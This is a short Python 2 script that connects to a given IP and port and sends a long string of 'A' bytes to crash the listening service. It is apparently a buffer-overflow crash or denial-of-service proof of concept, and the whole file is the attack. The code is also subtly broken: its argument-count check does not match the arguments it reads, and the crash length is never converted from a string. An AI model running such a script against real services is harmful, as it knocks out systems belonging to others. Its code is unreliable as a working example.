#!/usr/bin/python
import socket
import sys

if len(sys.argv) != 3: 
  print "Usage: "+ sys.argv[0]+ " <IP> <PORT> <LENCRASH>"
  sys.exit(-1)
IP=sys.argv[1]
PORT=sys.argv[2]
LENCRASH = sys.argv[3]

host = IP
port = int(PORT)

crashCode="\x41"*LENCRASH
toSend = "" + crashCode + "\r\n"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
print "[*] Sending crash data"
s.send(toSend)
s.close()

